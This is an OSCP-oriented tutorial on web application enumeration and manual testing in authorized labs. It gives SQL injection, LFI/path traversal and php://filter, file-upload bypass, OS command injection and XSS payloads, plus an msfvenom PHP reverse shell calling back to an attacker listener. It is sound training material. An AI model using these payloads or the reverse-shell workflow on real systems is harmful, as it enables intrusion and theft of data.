# Web Application Enumeration — OSCP Practical Workflow

> **Scope:** Authorized OSCP labs and explicitly permitted targets only. Start with a web service already discovered during [service enumeration](../01-Enumeration/service-enumeration.md).
>
> **Objective:** Map the application's hostnames, routes, technologies, authentication, exposed content and likely weaknesses before attempting exploitation.

## Quick navigation

- [Prepare the target and fingerprint the stack](#0-prepare-and-establish-the-correct-url)
- [Directory and FFUF discovery](#3-discover-directories-and-files)
- [DNS subdomains and virtual hosts](#4-identify-virtual-hosts-and-hostnames)
- [Authentication, APIs and uploads](#6-authentication-and-session-mapping)
- [CVE checks and SQL injection](#9-vulnerability-triage--from-evidence-to-verification)
- [LFI, PHP wrappers and path encoding](#directory-traversal-and-lfi--part-1-detection)
- [File upload and command injection](#file-upload--part-1-detection-and-restrictions)
- [Additional manual web checks](#10-further-manual-web-security-checks)
- [Exam tools and evidence rules](#11-exam-tool-policy-and-evidence-rules)
- [Troubleshooting and final checklist](#12-troubleshooting)

## 0. Prepare and establish the correct URL

```bash
export IP=192.168.56.101  # Replace with assigned target
export URL="http://$IP:80" # Change scheme and port to match Nmap
mkdir -p scans/web evidence/web
curl -i "$URL/"
```

Check the response status, `Location` redirects, cookies, page title, and any hostname mentioned in HTML or TLS certificates. If the lab provides a hostname, add it to `/etc/hosts` and use the hostname as your URL. If the site uses a self-signed certificate, inspect its details before choosing whether to use `curl -k` for lab-only inspection; `-k` disables certificate verification. Do not assume HTTP is always on 80 or HTTPS on 443.

## 1. Fingerprint the web stack

```bash
whatweb "$URL"
curl -sS -D scans/web/headers.txt -o scans/web/index.html "$URL/"
sudo nmap -Pn -sV -p 80 --script http-title,http-headers -oA scans/web/nmap-http "$IP"
```

Replace `-p 80` with the actual open port. Review:

- `Server`, `X-Powered-By`, `Set-Cookie`, and `Location` headers
- HTML comments, linked JavaScript/CSS and framework-specific routes
- CMS indicators and application version clues
- Redirects to hostnames or alternate ports

**Interpretation:** Headers and fingerprints can be hidden, misleading or backported. Treat version clues as hypotheses, not confirmed vulnerabilities.

## 2. Explore manually before brute-force discovery

Open the site in a browser and document:

1. Landing page, links, menus and accessible features.
2. Login, registration, password-reset and upload pages.
3. Query parameters, form fields and request methods.
4. API paths and JavaScript-referenced endpoints.
5. Redirects, cookies, error messages and access-control boundaries.

Capture representative requests and responses in Burp Suite Community or your browser's developer tools. Keep testing within the assigned application.

### Basic paths

```bash
curl -i "$URL/robots.txt"
curl -i "$URL/sitemap.xml"
curl -i "$URL/.well-known/security.txt"
```

A `404` is normal; do not assume these paths exist.

## 3. Discover directories and files

First, identify a working wordlist on Kali:

```bash
ls /usr/share/wordlists/dirb/common.txt
```

Then enumerate with a modest request rate:

```bash
gobuster dir -u "$URL/" -w /usr/share/wordlists/dirb/common.txt -t 10 -o scans/web/gobuster-dirs.txt
```

Try likely extensions when the application stack justifies them:

```bash
gobuster dir -u "$URL/" -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,bak -t 10 -o scans/web/gobuster-files.txt
```

**Interpretation:** `200` is a response, `301/302` a redirect, `401` authentication required, `403` access denied, and `404` not found. Applications may return `200` for nonexistent paths (wildcard responses); inspect body length and compare with a random nonexistent URL.

```bash
curl -i "$URL/this-path-should-not-exist-9f31"
```

Avoid treating every `200` as a discovered file.

### Discover directories and files with ffuf

`ffuf` is an alternative to Gobuster for discovering web paths. The keyword `FUZZ` marks the part of the URL that ffuf replaces with each wordlist entry.

Check whether ffuf and the built-in DIRB wordlist are installed:

```bash
command -v ffuf
ls /usr/share/wordlists/dirb/common.txt
```

If missing, install them on Kali:

```bash
sudo apt update
sudo apt install ffuf dirb
```

**Directory and path discovery:**

```bash
ffuf -u "$URL/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -rate 20 -mc all -fc 404 \
  -of json -o scans/web/ffuf-dirs.json
```

`-mc all` considers all response codes, and `-fc 404` hides standard 404 responses. Review `200`, `301/302`, `401`, and `403` findings manually.

**Find files with likely extensions:**

```bash
ffuf -u "$URL/FUZZ" \
  -w /usr/share/wordlists/dirb/common.txt \
  -e .php,.txt,.html,.bak \
  -rate 20 -mc all -fc 404 \
  -of json -o scans/web/ffuf-files.json
```

Use extensions that match the discovered application stack. `-e` appends the listed extensions to wordlist entries.

**Handle wildcard or custom 404 responses:**

```bash
curl -i "$URL/this-path-should-not-exist-9f31"
```

If the application returns a normal-looking `200` or a redirect for nonexistent paths, `-fc 404` alone will not remove false positives. Compare the response body sizes for a few random paths, then use a measured size filter such as `-fs SIZE` (replace `SIZE` with the observed byte count), or consider `-ac` for ffuf auto-calibration. Check that filtering does not hide genuine paths.

**Interpretation:** `FUZZ` is a placeholder, not a literal path. Both Gobuster and ffuf can discover the same resources; running both is optional, not a requirement. Respect rate limits and your lab's rules.

## 4. Identify virtual hosts and hostnames

Look for hostnames in redirects, HTML, certificates and DNS results. When an in-scope hostname is found, map it locally:

```bash
echo "$IP app.example.lab" | sudo tee -a /etc/hosts
curl -i "http://app.example.lab/"
```

Replace `app.example.lab` with a hostname grounded in your lab. Do not invent or scan unrelated domains.

For **DNS-backed subdomain discovery**, place `FUZZ` in the **URL hostname**, not in the HTTP `Host` header. This makes ffuf resolve each candidate subdomain and send a request to it. Kali commonly has SecLists at `/usr/share/seclists/` **if the `seclists` package is installed**. Check the actual path first:

```bash
ls /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

If the file is missing, install SecLists from Kali's package repositories:

```bash
sudo apt update
sudo apt install seclists
```

Then run ffuf with `FUZZ` in the subdomain position:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u "https://FUZZ.example.com/" \
  -rate 20 -of json -o scans/web/subdomains.json
```

Replace `example.com` with the **actual in-scope base domain**; change `https` and the port if needed. If `ffuf` is missing, install it with `sudo apt install ffuf`. **Important:** This is HTTP enumeration of DNS-resolvable subdomains, not a raw DNS record brute-force. Unresolvable candidates will fail; if you need DNS-only discovery, use `gobuster dns -d example.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` with the authorized base domain. For hostnames that exist only as virtual hosts on a lab IP (without DNS records), `Host: FUZZ.example.lab` against `http://$IP/` remains the appropriate separate technique.

## 5. Inspect HTTP methods and TLS

```bash
curl -i -X OPTIONS "$URL/"
```

An `Allow` header may advertise supported methods, but it is not proof of access to every method. Avoid sending destructive requests such as `DELETE` or `PUT` without explicit authorization.

For HTTPS, inspect the certificate and TLS configuration on the discovered port:

```bash
openssl s_client -connect "$IP:443" -servername app.example.lab </dev/null
sudo nmap -Pn -p 443 --script ssl-cert,ssl-enum-ciphers "$IP"
```

Use the real HTTPS port and hostname. The cipher script can generate many TLS handshakes.

## 6. Authentication and session mapping

Use a **test account provided by the lab**, if available. Document:

- Login and logout flow
- Session cookie names and flags (`HttpOnly`, `Secure`, `SameSite`)
- Authentication redirects and status codes
- Password-reset and registration behavior
- Differences between unauthenticated and authorized user views

Compare the same permitted URL with and without a test session. Do not perform credential spraying, bulk guessing, or access another user's data without authorization.

## 7. Enumerate APIs and parameters

From the application's pages and JavaScript, note API routes, parameter names, content types, and HTTP methods.

```bash
curl -i "$URL/api/"
curl -i -H 'Accept: application/json' "$URL/api/"
```

Only use routes actually discovered; `/api/` is illustrative. Review whether errors reveal stack traces, internal paths or unexpected data. Keep requests non-destructive.

## 8. File uploads and downloads

If the application provides an upload feature, inspect accepted file types, size limits, authentication requirements, storage location, and whether uploaded files are publicly accessible. Use a harmless text file for an explicitly authorized functionality check:

```bash
printf 'OSCP lab upload test\n' > evidence/web/upload-test.txt
```

Submit it through the normal application form only if uploads are in scope. Record the server response and whether the file can be retrieved. Do not upload executable payloads during initial enumeration.

To download an in-scope, publicly accessible file found during browsing:

```bash
curl -fL -o evidence/web/readme.txt "$URL/readme.txt"
file evidence/web/readme.txt
less evidence/web/readme.txt
```

Replace `readme.txt` with a discovered filename. `-f` fails on HTTP 4xx/5xx responses; `-L` follows redirects. Verify the final content is actually the expected file, not a login page.

## 9. Vulnerability triage — from evidence to verification

Investigate potential weaknesses based on observed functionality:

| Observation | Safe next check |
| --- | --- |
| Old-looking server or CMS version | Confirm actual version and compare with vendor advisories |
| Unauthenticated sensitive path | Verify the exact response and whether it contains sensitive information |
| Login or reset feature | Map flows and authorization boundaries using approved test accounts |
| Upload endpoint | Inspect validation, access control and retrieval behavior with harmless test files |
| API returns verbose errors | Record sanitized evidence and determine information exposure |
| User-controlled parameters | Identify input type, server-side handling and expected behavior |
| Unexpected HTTP methods | Confirm permitted methods non-destructively |

### Check outdated web software and possible CVEs

After fingerprinting a discovered web service, identify its **product and exact version**, then look up known vulnerabilities. Change `80,443` to the actual open web ports:

```bash
sudo nmap -Pn -sV --version-all -p 80,443 -oA scans/web/service-versions "$IP"
whatweb "$URL"
searchsploit --nmap scans/web/service-versions.xml
searchsploit "PRODUCT VERSION"
```

Replace `PRODUCT VERSION` with the identified software and version (for example, an Apache httpd version). Check the relevant vendor advisory or [NVD CVE database](https://nvd.nist.gov/) for affected versions, prerequisites and fixes. **A banner or SearchSploit result is only a lead:** verify the installed version, configuration and any backported security patches before calling the service vulnerable. Record the CVE ID, evidence and verification status; do not assume every older version is exploitable.

Research version-specific advisories:

```bash
searchsploit "Apache httpd"
searchsploit "WordPress"
```

Replace these examples with products actually identified. **A SearchSploit match, banner or scanner alert is not proof of a vulnerability.** Check prerequisites, affected versions, patches and configuration before recording a finding.

For relevant Nmap scripts:

```bash
nmap --script-help http-title
nmap --script-help 'http-vuln*'
```

Review script behavior before running any targeted vulnerability check; some scripts can be intrusive.

### Manual SQL injection (SQLi) — Part 1: detection

For **authorized lab targets only**, look for inputs that may feed database queries (URL query parameters, form fields and API parameters). Change one input at a time and compare with a baseline.

**1. Identify a parameter and record the normal response:**

```text
http://TARGET/product.php?id=1
```

**2. Test a single quote** (`%27` is URL-encoded `'`):

```text
http://TARGET/product.php?id=1%27
```

Look for database errors, unusual HTTP responses or changed content. A response difference **does not by itself prove SQLi**.

**3. Compare true versus false conditions** on a numeric parameter:

```sql
1 AND 1=1
1 AND 1=2
```

Submit each value separately (for example, in the `id` parameter) and compare status, body and application behavior with the baseline. Consistent differences are evidence to investigate, not confirmation. Use **Burp Suite Community (Free) → Repeater** to edit and compare individual HTTP requests manually.

**OSCP exam tool check:** [OffSec's OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly permits Burp Free and prohibits automatic exploitation tools such as **SQLmap** and **SQLninja**. Do not use prohibited features or AI assistance during the actual exam.

### Manual SQL injection (SQLi) — Part 2: UNION-based testing

Use **only after confirming a SQL injection point** in an authorized lab. The examples below assume a **single-quoted string parameter** and a MySQL-like comment syntax (`-- -`). Adapt quoting, comments, and URL encoding to the actual query and database. Send one manual test at a time using **Burp Suite Community (Free) → Repeater**.

**1. Determine the number of result columns.** Increase `ORDER BY` until the query fails; the previous working number is a clue to the column count:

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -
```

**2. Test a matching `UNION SELECT`.** For example, if there are three columns:

```sql
' UNION SELECT NULL,NULL,NULL-- -
```

`UNION` needs the same number of columns as the original query, with compatible data types. A failed response is not conclusive; the injection context may require different syntax.

**3. Find a reflected text column.** If the three-column example succeeds, replace one `NULL` at a time with an identifiable string:

```sql
' UNION SELECT NULL,'OSCP_TEST',NULL-- -
```

If `OSCP_TEST` appears in the page, that column may be useful for displaying results.

**4. Identify database details** only in a compatible, reflected column. Example for **MySQL/MariaDB** with three columns:

```sql
' UNION SELECT NULL,version(),NULL-- -
' UNION SELECT NULL,database(),NULL-- -
```

Database functions differ: for **Microsoft SQL Server**, examples include `@@VERSION` and `DB_NAME()`. Do not assume the same payload works across database engines.

**Record:** injectable URL/parameter, baseline response, working column count, reflected column, detected database, and sanitized response evidence. Manual testing with Burp Free is permitted under the [official OffSec OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide); automatic exploitation tools such as SQLmap and SQLninja are prohibited.

### Manual SQL injection (SQLi) — Part 3: blind testing

Use blind SQLi tests on **authorized lab targets** when the query output is not reflected in the HTTP response. Start with the baseline and change **one parameter at a time**. The examples assume a **single-quoted string parameter** and MySQL/MariaDB-style comments (`-- -`); adapt the syntax to the actual input and database.

**1. Boolean-based blind SQLi:** Compare a condition that is true with one that is false:

```sql
' AND 1=1-- -
' AND 1=2-- -
```

Send each payload manually using **Burp Suite Community (Free) → Repeater**. Compare the response status, page content, word count and redirects. A repeatable difference between true and false requests may indicate injection even when SQL errors and query results are not shown. Verify against the original request and normal application behavior.

**2. Time-based blind SQLi:** If no visible difference exists, and the backend appears to be **MySQL/MariaDB**, compare a conditional delay against its false control:

```sql
' AND IF(1=1,SLEEP(5),0)=0-- -
' AND IF(1=2,SLEEP(5),0)=0-- -
```

The first condition requests a roughly 5-second delay if the expression is evaluated; the second should not. Send only a few manual requests and repeat to rule out network jitter, server load or caching. These payloads are **database-specific**: SQL Server, PostgreSQL and SQLite use different approaches, and timeouts or query optimization can affect results.

**Record:** the parameter, baseline, true/false request and response differences, repeatable timing observations, and the DBMS assumed. Neither a single slow response nor a single content change proves SQLi.

**OSCP exam tool check:** [OffSec's OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly permits **Burp Free**; it prohibits automatic exploitation tools including **SQLmap** and **SQLninja**, as well as AI chatbot assistance during the exam. Use manual Repeater requests, not prohibited automation.

### Directory traversal and LFI — Part 1: detection

Use this **only against authorized lab applications**. Look for parameters that select a file or template (for example, `?page=home.php` or `?file=help.txt`). **Directory traversal** uses path sequences such as `../` to move outside an intended directory; **local file inclusion (LFI)** occurs when a web application includes a local file as part of processing a request.

**1. Establish a baseline.** Find a working file parameter and record the original status, body and redirect behavior:

```text
http://TARGET/index.php?page=home.php
```

**2. Test one traversal path manually.** On an authorized Linux lab, compare the baseline with:

```text
http://TARGET/index.php?page=../../../../etc/passwd
```

If the application returns recognizable local file content (for example, lines formatted like `root:x:0:0:...`), that is evidence of unintended file access. A `404`, `403`, blank response or error **does not prove** the target is safe or vulnerable. File paths, filtering and the application's expected suffix/prefix may vary.

**3. Validate and document.** Use **Burp Suite Community (Free) → Repeater** (or manual `curl` requests) to change one parameter at a time. Check that results are consistent and actually originate from the target, then record the exact request, response, path depth and evidence. Do not access unnecessary sensitive files or publish real data in this public repository.

**Exam tool check:** [OffSec's OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly allows **Burp Free**. Manual requests are not automatic exploitation. The guide prohibits commercial Burp Pro, automatic exploitation tools and AI chatbot assistance during the exam. Check the latest guide before exam day.

### LFI — Part 2: PHP wrappers (`php://filter`)

Use this **only on authorized PHP lab targets** where a file parameter may be used in a PHP `include` or `require` call. The `php://filter` wrapper can apply a conversion to file content before it is included. Encoding PHP source as Base64 helps display the source rather than execute it.

**1. Establish a baseline** with an existing in-scope page:

```text
http://TARGET/index.php?page=home.php
```

**2. Try reading that page through the Base64 filter:**

```text
http://TARGET/index.php?page=php://filter/convert.base64-encode/resource=home.php
```

The part after `resource=` is the local file path. Adjust it only to match an in-scope file you have identified. A successful response may contain a Base64 string beginning with `PD9waHA` (often the encoding of `<?php`).

**3. Decode an extracted Base64 value locally:**

```bash
printf '%s' 'PASTE_BASE64_HERE' | base64 -d
```

Copy **just the encoded string**, not the surrounding HTML. Inspect the decoded output locally; do not post source code, credentials or secrets in this public repository.

**Troubleshooting:** The application may append its own suffix (such as `.php`), block wrappers, enforce path restrictions, or return a rendered/encoded HTML response. A failed attempt does not rule out LFI, and a Base64-looking response alone is not proof of PHP source disclosure. Compare with the baseline and preserve sanitized evidence.

**Exam tool check:** Manual requests through **Burp Suite Community (Free) → Repeater** are compatible with the [OffSec OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide), which explicitly allows Burp Free. The `base64` command performs local decoding, not automatic exploitation. The guide prohibits automatic exploitation tools and AI chatbot assistance during the exam. Recheck the current rules before exam day.

### LFI — Part 3: path traversal bypasses and URL encoding

Use these examples **only against authorized lab targets** and only after identifying a file-loading parameter. Some applications block `../` using incomplete input filtering. Compare each manual request with a valid baseline, changing **one thing at a time**. These examples assume a Linux target and a `file` parameter.

**1. Baseline traversal** — test whether the application reads outside its intended directory:

```text
http://TARGET/index.php?file=../../../../etc/passwd
```

**2. URL-encoded slashes** — `%2f` represents `/` in URL encoding:

```text
http://TARGET/index.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd
```

**3. Double URL encoding** — `%252f` may become `%2f` after one decoding step and `/` after a second:

```text
http://TARGET/index.php?file=..%252f..%252f..%252f..%252fetc%252fpasswd
```

This is relevant only if multiple decoding stages occur; don't assume it bypasses a filter.

**4. Nested traversal** — may expose a filter that simply strips one occurrence of `../`:

```text
http://TARGET/index.php?file=....//....//....//....//etc/passwd
```

**Verify:** Use **Burp Suite Community (Free) → Repeater** to send requests manually. Check the **raw request target** to ensure the encoding is preserved, then compare status codes, response bodies and any error messages with the baseline. A recognizable file response is evidence; a `403`, `404`, or failed request is not proof that LFI is absent. Stop at the minimum evidence needed and never publish sensitive file contents in this repository.

**OSCP exam tool check:** The [OffSec OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly permits **Burp Free**; it prohibits **Burp Pro**, automatic exploitation tools and AI chatbot assistance during the exam. These examples use manual requests, not automated exploitation.

### File Upload — Part 1: detection and restrictions

Use **only on authorized OSCP lab applications**. Locate upload features such as profile pictures, document attachments or administration forms. Before investigating bypasses, determine how the application handles an ordinary **harmless** file.

**1. Identify an upload form.** Note its action URL, HTTP method, multipart field name, authentication requirements and permitted formats. Capture one normal request using **Burp Suite Community (Free)**.

**2. Create a harmless text file and upload it through the application's normal form:**

```bash
printf 'OSCP upload test\n' > oscp-test.txt
```

If the form's endpoint and field name are known, send the same simple request manually with `curl`:

```bash
curl -i -X POST \
  -F "file=@oscp-test.txt;type=text/plain" \
  "http://TARGET/upload"
```

Replace `http://TARGET/upload` and `file` with the actual in-scope endpoint and multipart field name. Login sessions, anti-CSRF tokens and additional fields may be required; an illustrative command may fail without them.

**3. Inspect upload restrictions and handling.** Record:

- Which file extensions and declared `Content-Type` values are accepted or rejected.
- Whether the server renames files, changes extensions or checks their content.
- Where the uploaded file is stored and whether a URL is returned.
- Whether the file can be retrieved, and whether it is displayed or downloaded.

**Interpretation:** A successful upload is **not automatically a vulnerability**. Confirm what is stored and how it is served. Use only benign files at this stage; do not upload executable payloads or attempt extension bypasses yet. Record sanitized request/response evidence, and remove test files if the lab provides a safe way to do so.

**OSCP exam tool check:** [OffSec's OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly permits **Burp Free**, but prohibits **Burp Pro**, automatic exploitation tools and AI chatbot assistance during the exam. `curl` here is used for a manual HTTP request, not exploitation automation. Recheck the rules before the exam.

### File Upload — Part 2: file extension and Content-Type bypass testing

Use this **only in an authorized OSCP lab** after completing Part 1. Identify a working upload request, save its **baseline response**, then change **one field per test** in **Burp Suite Community (Free) → Repeater**. Keep the file's contents harmless so you can evaluate the validation behavior without running code.

**1. Test how the server validates extensions.** Create a harmless marker file:

```bash
printf 'OSCP upload check\n' > upload-check.txt
```

In the captured multipart request, change only the `filename=` value while keeping the file contents and `Content-Type` unchanged. Example candidate names to test individually:

```text
upload-check.php
upload-check.phtml
upload-check.php5
upload-check.php.jpg
upload-check.jpg.php
```

These extensions and double extensions may be interpreted differently by filters and web servers. They are **test cases**, not guaranteed bypasses. Don't assume an uploaded file executes merely because its name contains `.php`.

**2. Test client-supplied MIME type (`Content-Type`).** For the *same* harmless test file and filename, modify just the multipart part header in Burp Repeater:

```http
Content-Disposition: form-data; name="file"; filename="upload-check.php"
Content-Type: image/png
```

Or send a single manual request using `curl` after identifying the real endpoint and field name:

```bash
curl -i -F "file=@upload-check.txt;filename=upload-check.php;type=image/png" \
  "http://TARGET/upload"
```

The bytes remain plain text even when the declared MIME type is `image/png`. An application that trusts that header alone may accept an unexpected file, but this **does not by itself confirm code execution**. A correctly configured server may inspect the actual file bytes, normalize names, change extensions or store files outside the web root.

**3. Validate the outcome.** Compare the HTTP status **and response body** for each test, and note any server-assigned filename, storage path or retrieval URL. If a harmless file is retrievable, inspect how it is served (download vs. inline content), without uploading executable payloads at this stage. Stop after establishing the minimal evidence needed, and remove test files when permitted.

**OSCP exam tool check:** [OffSec's OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly permits **Burp Free** and prohibits **Burp Pro**, automatic exploitation tools and AI chatbot assistance during the exam. `curl` is used here only for one manually chosen HTTP request. Recheck the latest rules before exam day.

### File Upload — Part 3: verify PHP execution and obtain a reverse shell

Use this workflow **only for authorized OSCP labs**. After an application accepts a PHP upload, first verify that the web server **executes** it; uploading or downloading a `.php` file alone is not enough. The commands below assume a PHP-capable Linux web server and a known, in-scope upload URL.

**1. Upload a harmless PHP execution marker**, using the upload method verified in Parts 1–2:

```bash
printf '%s\n' '<?php echo "OSCP_UPLOAD_SUCCESS"; ?>' > oscp-test.php
```

After uploading, visit the **actual returned file URL** (the following path is only illustrative):

```bash
curl -i "http://TARGET/uploads/oscp-test.php"
```

If the response contains `OSCP_UPLOAD_SUCCESS` **without displaying the PHP source**, that suggests PHP ran on the server. If PHP source is shown, the file is downloaded, or access is blocked, do **not** assume execution. Confirm the marker did not appear in the baseline.

**2. Once execution is confirmed, set up a reverse-shell listener** on your Kali machine:

```bash
ip -br addr                 # Identify your VPN interface/IP
nc -lvnp 4444               # Run in a separate terminal
```

**3. Generate a non-Meterpreter PHP reverse shell** for your VPN IP and the matching listener port:

```bash
msfvenom -p php/reverse_php LHOST=10.10.14.2 LPORT=4444 -f raw -o oscp-shell.php
```

Replace `10.10.14.2` with **your actual Kali VPN IP**. Upload `oscp-shell.php` through the verified vulnerability, then request the **actual uploaded file URL** to trigger it:

```bash
curl -i "http://TARGET/uploads/oscp-shell.php"
```

If the target can connect back and PHP execution is enabled, check your Netcat terminal for an incoming shell. The HTTP request may remain open while the shell runs. Only run this on systems you are authorized to exploit.

**4. Stabilize an interactive shell**, if Python 3 and Bash exist on the target:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

Then verify context with `whoami`, `id`, and `hostname`. This shell initially runs with the web service's privileges, **not automatically root**. If there is no callback, check the VPN IP, port, listener, routing, outbound filtering, PHP execution, and any disabled PHP functions. Record sanitized evidence, not secrets.

**OSCP exam tool check:** The [official OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly permits Burp Free and allows `msfvenom` on all targets; Metasploit modules and **Meterpreter** are restricted to one target. The `php/reverse_php` payload used above is **not Meterpreter**. `nc` is a manual listener, not an automatic exploitation tool. Do not use AI chatbots during the actual exam. Exam proof files must be read in an **interactive shell** with `cat` or `type` from their original location—**not through a web shell**.

### OS Command Injection — Part 1: manual detection

Use these checks **only on authorized OSCP lab targets**. Look for inputs that might be passed to operating-system commands (for example, network diagnostic forms, hostname lookups or file-processing features). A user-controlled parameter is **not necessarily** command-injectable.

**1. Establish a baseline.** In a discovered diagnostic feature, submit its normal input and record the response:

```text
127.0.0.1
```

**2. Test common shell operators manually**, one request at a time in **Burp Suite Community (Free) → Repeater**. These examples assume a Linux/Unix shell, and that the application passes the input into a shell command:

```bash
127.0.0.1; echo OSCP_CMD_TEST
127.0.0.1 && echo OSCP_CMD_TEST
127.0.0.1 | echo OSCP_CMD_TEST
```

- `;` separates commands, whether or not the preceding command succeeds.
- `&&` runs the following command only if the previous one succeeds.
- `|` sends the previous command's output to the next command's standard input; the `echo` marker here does not need that input.

If `OSCP_CMD_TEST` appears **only after the test** and is not merely reflected user input, investigate whether the server actually executed the extra command. Compare response bodies, status codes and the original baseline. Do not confuse client-side reflection with execution.

**3. If output is hidden, test a short timing difference** (Linux/Unix example):

```bash
127.0.0.1; sleep 5
```

Compare with the normal request multiple times. A delay by itself is **not proof**: network jitter, backend load or rate limiting can produce false positives. Stop after a few controlled tests.

**4. Handle URL encoding and document the result.** For a query-string request, special characters may need URL encoding (for example, `;` → `%3B`, space → `%20`, `&` → `%26`). Preserve the intended request in Burp Repeater. Record the parameter, baseline, test payload, response difference and confirmation status. The exact syntax differs on Windows and when no shell is involved.

**OSCP exam tool check:** The [official OffSec OSCP+ Exam Guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide) explicitly allows **Burp Free**. These are individual manual tests, not automated exploitation. The guide prohibits Burp Pro, automatic exploitation tools and AI chatbots during the actual exam.

## Additional enumeration checks

### Inspect JavaScript and discover referenced endpoints

JavaScript bundles often mention API routes, alternate hostnames and application features not linked in navigation. First list scripts from browser developer tools or page source:

```bash
grep -Eo 'src="[^"]+\.js[^"]*"' scans/web/index.html
```

This simple grep only catches some double-quoted script references; inspect the DOM/network tab for dynamically loaded scripts and relative paths. Fetch **only scripts belonging to the in-scope application** and search locally for routes and keywords:

```bash
curl -fL -o evidence/web/app.js "$URL/static/app.js"
grep -En 'api/|fetch\(|axios|endpoint|graphql' evidence/web/app.js
```

`/static/app.js` is illustrative: substitute a path actually found. JavaScript references are leads, not evidence that an endpoint is accessible.

### Inspect common metadata and source maps

```bash
curl -i "$URL/manifest.json"
curl -i "$URL/favicon.ico"
```

Check discovered script URLs for a referenced `sourceMappingURL`. Source maps may expose readable client-side source code, but are not automatically a vulnerability. Record only in-scope findings and avoid publishing secrets.

### Check supported technologies only when identified

For an application identified as WordPress, use a purpose-built scanner only if it is installed and allowed by the lab:

```bash
command -v wpscan
wpscan --url "$URL" --plugins-detection passive
```

The command is **WordPress-specific**; do not run it against unrelated frameworks. Passive results can still be incomplete or misleading. CMS plugins, themes and versions require verification.

### Enumerate parameters and form inputs

For each discovered page, record GET parameters, POST fields, JSON keys, multipart fields and relevant headers. Use Burp Repeater to compare a baseline request against **one changed input at a time**, keeping requests within the permitted test accounts.

```bash
curl -i "$URL/search?q=test"
```

`/search?q=` is only an example; replace it with a route and parameter found on your target. Note whether inputs appear in responses, redirects, errors or database-backed features. This prepares later SQLi, XSS, LFI and access-control testing without claiming any issue exists.

### Review authorization boundaries and common exposures

Using approved accounts and harmless resources, note whether unauthenticated and authenticated requests return different content for the **same** URL. For applications with multiple supplied test roles, compare which menus and endpoints each role is expected to access; do not access other users' private records.

Check for exposed backups, debug pages, configuration files and directory listings **only when discovered or explicitly in scope**. A `403` usually means access is denied; do not assume bypass.

### Review response security headers and CORS

```bash
curl -sSI "$URL/"
curl -i -H 'Origin: https://example.invalid' "$URL/"
```

Look for `Content-Security-Policy`, `Strict-Transport-Security` (HTTPS only), `X-Content-Type-Options`, `Referrer-Policy`, and `Access-Control-Allow-Origin`. Missing headers are context-dependent hardening observations; CORS requires careful analysis of origin reflection and credential handling before calling it exploitable.

### Keep separate notes for each web service

A target may host different applications on `80`, `443`, `8080`, `8443`, and named virtual hosts. Repeat the workflow for each **discovered in-scope** application and maintain separate output folders so evidence does not overwrite earlier results.

## 10. Further manual web security checks

The earlier sections cover initial discovery, SQLi, LFI, file uploads and initial command-injection detection. The following **short manual workflows** fill other important web-testing gaps. Test only explicitly in-scope functionality, using lab-provided accounts where needed. Record a baseline, change one input at a time, and verify evidence rather than assuming every unusual response is a vulnerability.

### OS Command Injection — Part 2: follow-up after confirmed execution

Only proceed if Part 1 demonstrated actual server-side OS command execution (not reflected input). Decide whether an interactive shell is necessary for the lab objective.

1. Identify your Kali VPN address and open a manual listener in a separate terminal:

~~~bash
ip -br addr
nc -lvnp 4444
~~~

2. If the authorized lab calls for a reverse shell, use a **manually chosen, non-Meterpreter shell method** appropriate to the target OS and available interpreters, and submit it through the already-confirmed injection point. The parameter value may need URL encoding; make sure its quoting and delimiters reach the application unchanged. Avoid automatic exploitation or unreviewed scripts.
3. Once a legitimate callback is established, identify the user and, if supported, improve interactivity:

~~~bash
whoami
id
hostname
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
~~~

The Python step is for a Linux target with Python 3 and Bash installed. A web-server shell typically runs as a low-privileged service account. If there is no callback, verify the injection point, VPN address, listener, target shell, outbound connectivity and encoding instead of blindly retrying. Keep an exact, sanitized record of the request and resulting shell context.

### Reflected, stored and DOM-based XSS — manual checks

Identify URL parameters, search fields, comments, profile fields and client-side JavaScript that display user-controlled input.

1. Submit an identifiable harmless value (for example, `OSCP_XSS_MARKER`) and check whether it appears in HTML, attributes or JavaScript.
2. On the **authorized lab application**, try a simple browser-only proof of concept in a suitable HTML context:

~~~html
<script>alert(1)</script>
~~~

3. Check whether a browser actually executes the script rather than displaying it as text. For stored XSS, use only a lab-provided account or page you control; for DOM XSS, inspect client-side sources such as URL fragments and sinks such as `innerHTML`.

A reflected marker is **not XSS** by itself. Output encoding, CSP, input context and browser behavior matter. Do not use credential-exfiltration or session-theft payloads. Record the entry point and the exact browser behavior.

### Authentication, sessions and IDOR/BOLA

Use **two supplied test accounts** (or two lab roles) and a resource created by each account. Capture the same request in Burp Free Repeater and compare allowed versus disallowed behavior.

- **Authentication:** inspect login and logout behavior, password-reset flows, lockout/rate-limit signals and whether access is actually denied without a valid session.
- **Sessions:** inspect `Set-Cookie` flags (`HttpOnly`, `Secure`, `SameSite`), whether logout invalidates the session, and whether a pre-login session identifier is rotated after login.
- **IDOR / BOLA:** for an endpoint such as `GET /api/orders/101`, verify whether account A can access a resource that belongs to account B after **only the resource ID changes**. An authenticated `200` response is not enough: inspect whether it exposes data or functionality belonging to the other authorized test user.
